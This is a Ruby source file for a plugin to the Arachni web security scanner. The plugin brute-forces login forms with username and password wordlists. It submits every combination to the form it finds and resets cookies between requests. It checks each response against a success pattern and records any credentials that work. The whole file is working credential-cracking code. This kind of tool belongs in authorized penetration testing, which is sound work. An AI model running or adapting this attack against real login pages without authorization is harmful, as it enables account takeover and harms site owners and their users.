=begin
                  Arachni
  Copyright (c) 2010-2011 Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>

  This is free software; you can copy and distribute and modify
  this program under the term of the GPL v2.0 License
  (See LICENSE file for details)

=end

module Arachni
module Plugins

#
# @author: Tasos "Zapotek" Laskos
#                                      <tasos.laskos@gmail.com>
#                                      <zapotek@segfault.gr>
# @version: 0.1
#
class FormDicattack < Arachni::Plugin::Base

    attr_accessor :http

    #
    # @param    [Arachni::Framework]    framework
    # @param    [Hash]        options    options passed to the plugin
    #
    def initialize( framework, options )
        @framework = framework
        @options   = options

        # disable spidering and the subsequent audit
        # @framework.opts.link_count_limit = 0

        # don't scan the website just yet
        @framework.pause!
    end

    def prepare
        @url     = @framework.opts.url.to_s
        @users   = File.read( @options['username_list'] ).split( "\n" )
        @passwds = File.read( @options['password_list'] ).split( "\n" )
        @user_field   = @options['username_field']
        @passwd_field = @options['password_field']
        @verifier     = Regexp.new( @options['login_verifier'] )

        @parser = Arachni::Parser.new( @framework.opts )

        # we need to declare this in order to pass ourselves
        # as the auditor to the form later in order to submit it.
        @http = @framework.http

        @found = false
    end

    def run( )

        if !form = login_form
            print_error( 'Could not find a form suiting the provided params at: ' +
                @url )
            return
        end

        name = form.raw['attrs']['name'] ? form.raw['attrs']['name'] : '<n/a>'
        print_status( "Found log-in form with name: "  + name )

        print_status( "Building the request queue..." )

        total_req = @users.size * @passwds.size
        print_status( "Number of requests to be transmitted: #{total_req}" )

        # register us as the auditor
        form.auditor( self )
        @users.each {
            |user|
            @passwds.each {
                |pass|

                params = {
                    @user_field     => user,
                    @passwd_field   => pass
                }

                # merge the input fields of the form with our own params
                form.auditable.merge!( params.dup )

                # we need a clean cookie slate for each request
                opts = {
                    :headers => {
                        'cookie'  => ''
                    }
                }
                form.submit( opts ).on_complete {
                    |res|

                    next if @found

                    print_status( "#{@user_field}: '#{res.request.params[@user_field]}'" +
                        " -- #{@passwd_field}: '#{res.request.params[@passwd_field]}'" )

                    next if !res.body.match( @verifier )

                    @found = true

                    print_ok( "Found a match. #{@user_field}: '#{res.request.params[@user_field]}'" +
                        " -- #{@passwd_field}: '#{res.request.params[@passwd_field]}'" )

                    # register our findings...
                    register_results( { :username => user, :password => pass } )
                    clean_up( )

                    raise "Stopping the attack."
                }

            }
        }

        print_status( "Waiting for the requests to complete..." )
        @http.run
        print_error( "Couldn't find a match." )

    end

    def clean_up
        # abort the rest of the queued requests
        @http.abort

        # continue with the scan
        @framework.resume!
    end

    def login_form
        # grab the page containing the login form
        res  = @http.get( @url, :async => false ).response

        # parse the response as a Page object
        page = @parser.run( @url, res.body, res.headers_hash )

        # find the login form
        form = nil
        page.forms.each {
            |cform|
            form = cform if login_form?( cform )
        }

        return form
    end


    def login_form?( form )
        avail    = form.auditable.keys
        provided = [ @user_field, @passwd_field ]

        provided.each {
            |name|
            return false if !avail.include?( name )
        }

        return true
    end


    def self.info
        {
            :name           => 'Form dictionary attacker',
            :description    => %q{Uses wordlists to crack login forms.
                If the cracking process is successful the found credentials will be set
                framework-wide and used for the duration of the audit.
                If that's not what you want set the crawler's link-count limit to "0".},
            :author         => 'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>',
            :version        => '0.1',
            :options        => [
                Arachni::OptPath.new( 'username_list', [ true, 'File with a list of usernames (newline separated).' ] ),
                Arachni::OptPath.new( 'password_list', [ true, 'File with a list of passwords (newline separated).' ] ),
                Arachni::OptString.new( 'username_field', [ true, 'The name of the username form field.'] ),
                Arachni::OptString.new( 'password_field', [ true, 'The name of the password form field.'] ),
                Arachni::OptString.new( 'login_verifier', [ true, 'A string that will be used to verify a successful login.
                    For example, if a logout link only appears when a user is logged in then it can be a perfect choice.'] ),
            ]
        }
    end

end

end
end
